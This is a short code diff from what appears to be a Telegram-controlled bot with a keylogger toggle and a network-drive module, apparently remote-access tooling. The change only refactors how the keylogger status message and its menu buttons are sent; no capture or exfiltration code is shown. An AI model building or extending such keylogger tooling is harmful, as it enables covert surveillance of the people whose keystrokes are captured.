@@ -9,7 +9,7 @@ from modules import Environment
 from modules import Configuration
 from modules import NetworkDrive
 import constants
-from utils import getarg, getMarkupModes, validate_time_argument, create_menu_markup, send_default_message, send_message
+from utils import getarg, getMarkupModes, validate_time_argument, create_menu_markup, send_message
 
 
 async def keylogger_callback(bot, call):
@@ -19,7 +19,9 @@ async def keylogger_callback(bot, call):
     else:
         status = '\U0001f534OFF'
 
-    await send_default_message(bot, call.message, text=constants.KEYLOGGER_preview + f'\n\nStatus: {status}', markup_arg=modes)
+    markup = getMarkupModes(modes)
+
+    await send_message(bot, call.message.chat.id, text=constants.KEYLOGGER_preview + f'\n\nStatus: {status}', markup_arg=markup)
 
 
 async def on_callback(bot, call):
